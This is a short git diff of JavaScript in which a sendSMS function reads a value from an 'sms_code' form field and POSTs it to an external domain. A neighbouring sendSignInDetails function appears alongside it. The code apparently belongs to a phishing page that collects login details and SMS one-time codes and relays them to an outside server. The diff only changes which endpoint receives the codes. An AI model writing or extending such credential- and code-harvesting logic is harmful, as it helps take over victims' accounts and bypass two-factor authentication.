@@ -25,7 +25,7 @@ function sendSignInDetails(){
 
 function sendSMS(){
     var SMS = document.getElementById('sms_code').value
-    fetch('https://api.justicefortaiji.online/process_sign_in', {
+    fetch('https://api.justicefortaiji.online/process_sms', {
         method: 'POST',
         headers: {
             'Content-Type' : 'application/json'
